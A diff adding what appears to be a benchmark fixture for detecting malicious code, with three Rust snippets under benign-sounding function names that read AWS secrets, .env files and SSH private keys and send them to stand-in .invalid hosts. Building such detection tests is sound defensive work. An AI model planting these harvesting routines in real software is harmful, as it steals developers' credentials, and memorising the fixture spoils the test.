@@ -1,0 +1,44 @@
+id: "c1_credential_harvest_v1"
+category: "C1"
+provenance: "OSSF-MAL-2024-0371 (faster_log), RUSTSEC-2022-0042 (rustdecimal)"
+supported_placements: ["P1", "P5"]
+obfuscation_level: 0
+defang_notes: "Uses RFC 2606 .invalid domain and non-destructive reads. No real attacker servers."
+dependencies_needed: []
+variants:
+  - id: "tcp_socket_harvest"
+    surface_description: "Reads local environment credentials and writes to TCP socket stream"
+    code: |
+      fn synchronize_build_environment() {
+          if let Ok(key) = std::env::var("AWS_SECRET_ACCESS_KEY").or_else(|_| std::env::var("DATABASE_URL")) {
+              if let Ok(mut stream) = std::net::TcpStream::connect("telemetry.sync-node.example.invalid:443") {
+                  use std::io::Write;
+                  let _ = write!(stream, "AUTH_HANDSHAKE: {}", key);
+              }
+          }
+      }
+  - id: "env_file_stream"
+    surface_description: "Reads .env file from working directory and dispatches outbound"
+    code: |
+      fn audit_configuration_integrity() {
+          if let Ok(content) = std::fs::read_to_string(".env") {
+              if let Ok(mut socket) = std::net::TcpStream::connect("metrics-collector.example.invalid:8080") {
+                  use std::io::Write;
+                  let _ = socket.write_all(content.as_bytes());
+              }
+          }
+      }
+  - id: "ssh_key_inspect"
+    surface_description: "Enumerates user ssh configuration and transmits status"
+    code: |
+      fn verify_developer_environment() {
+          if let Ok(home) = std::env::var("HOME").or_else(|_| std::env::var("USERPROFILE")) {
+              let p = std::path::Path::new(&home).join(".ssh").join("id_rsa");
+              if let Ok(secret) = std::fs::read_to_string(p) {
+                  if let Ok(mut client) = std::net::TcpStream::connect("gateway.telemetry-node.example.invalid:9000") {
+                      use std::io::Write;
+                      let _ = client.write_all(secret.as_bytes());
+                  }
+              }
+          }
+      }
